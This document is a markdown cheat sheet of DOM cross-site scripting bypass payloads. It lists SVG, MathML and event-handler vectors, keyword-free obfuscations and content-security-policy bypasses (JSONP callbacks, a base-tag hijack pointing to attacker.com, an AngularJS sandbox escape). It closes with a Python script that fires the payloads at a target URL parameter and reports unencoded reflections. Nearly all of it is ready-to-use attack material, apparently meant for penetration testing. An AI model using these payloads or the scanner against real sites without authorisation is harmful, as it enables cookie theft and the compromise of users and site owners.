# DOM XSS — Advanced Bypass Payloads

## SVG / MathML context

```html
<svg><animatetransform onbegin=alert(1)>
<svg><set onbegin=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><a><rect width=100% height=100% /><animate attributeName=href values=javascript:alert(1) />
<svg/onload=alert(1)>
```

## Uncommon event handlers (auto-firing)

```html
<details open ontoggle=alert(1)>
<details/open/ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<marquee onstart=alert(1)>
<marquee onfinish=alert(1)>
<marquee loop=1 onfinish=alert(1)>test</marquee>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
```

## Tag/attribute variations

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- No spaces -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Backticks -->
<svg onload=alert`1`>

<!-- Indirect alert reference -->
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="self['ale'+'rt'](1)">
<img src=x onerror="top['al'+'ert'](1)">

<!-- Unicode escapes -->
<img src=x onerror="alert(1)">

<!-- Without "alert" keyword -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=print()>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- Throw + onerror handler -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- href entity encoding -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- data: URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## CSP bypass patterns

### JSONP callback exploitation
If CSP allows a domain serving JSONP (`https://accounts.google.com`, CDN endpoints):
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdn.example.com/jsonp?callback=alert(document.cookie)//"></script>
```
Common JSONP patterns: `/api/jsonp?callback=X`, `/widget?cb=X`, `/search?format=jsonp&callback=X`.

### Base-tag hijack
CSP uses nonce/hash but doesn't restrict `base-uri`:
```html
<base href="https://attacker.com/">
<!-- subsequent <script src="/app.js"> loads from attacker -->
```

### `unsafe-eval`
```html
<script>eval('ale'+'rt(1)')</script>
<script>new Function('alert(1)')()</script>
<script>setTimeout('alert(1)',0)</script>
```

### `unsafe-inline`
Inline scripts and event handlers both work — full XSS surface.

### Nonce reuse / prediction
If nonce is static/predictable, or if you can extract it from page source, reuse:
```html
<script nonce="KNOWN_NONCE">alert(1)</script>
```

### CDN-based bypass with AngularJS
CSP `script-src cdn.jsdelivr.net` →
```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## Automated detection script

```python
#!/usr/bin/env python3
"""Test a single param for XSS reflection across multiple payload variants."""
import requests, sys, urllib.parse, re, html, random, string

def canary():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def detect_context(text, c):
    i = text.find(c)
    if i < 0: return "not-found"
    before = text[max(0,i-100):i]
    if '<script' in before.lower() and '</script>' not in before.lower(): return "javascript"
    if re.search(r'["\']$', before.rstrip()): return "attribute"
    if re.search(r'<\w+[^>]*$', before): return "tag-attribute"
    return "html-body"

def send(url, param, value, method, cookies, headers):
    try:
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            return requests.get(f"{url}{sep}{param}={urllib.parse.quote(value)}",
                                headers=headers, cookies=cookies, timeout=10)
        return requests.post(url, data={param: value}, headers=headers, cookies=cookies, timeout=10)
    except Exception: return None

def test_xss(url, param, method="GET", cookies=None):
    h = {"User-Agent": "Mozilla/5.0"}
    c = canary()
    r = send(url, param, c, method, cookies, h)
    if not r or c not in r.text:
        print(f"  [-] No reflection for '{param}'"); return []
    print(f"  [*] Context: {detect_context(r.text, c)}")
    payloads = [
        ("img onerror", f'<img src=x onerror=alert("{c}")>'),
        ("svg onload", f'<svg onload=alert("{c}")>'),
        ("details ontoggle", f'<details open ontoggle=alert("{c}")>'),
        ("attr breakout dq", f'"><img src=x onerror=alert("{c}")>'),
        ("attr breakout sq", f"'><img src=x onerror=alert('{c}')>"),
        ("attr breakout event", f'" onfocus=alert("{c}") autofocus="'),
        ("script breakout", f'</script><img src=x onerror=alert("{c}")>'),
        ("js string breakout", f"';alert('{c}');//"),
        ("svg animate", f'<svg><animate onbegin=alert("{c}") attributeName=x dur=1s>'),
        ("input autofocus", f'<input onfocus=alert("{c}") autofocus>'),
        ("body onload", f'<body onload=alert("{c}")>'),
        ("href javascript", f'javascript:alert("{c}")'),
        ("data uri", f'data:text/html,<script>alert("{c}")</script>'),
    ]
    found = []
    for name, p in payloads:
        r = send(url, param, p, method, cookies, h)
        if r and p in r.text and html.escape(p) not in r.text:
            found.append(f"[REFLECTED unencoded] {name}")
        elif r and p in r.text:
            found.append(f"[PARTIAL] {name}")
    return found

if __name__ == "__main__":
    target, param = sys.argv[1], sys.argv[2]
    method = sys.argv[3] if len(sys.argv) > 3 else "GET"
    for f in test_xss(target, param, method): print("  [+]", f)
```

For exhaustive payload coverage see `xss-bypass-techniques.md` and `scenarios/dom-vulnerabilities/waf-filter-bypass.md`.
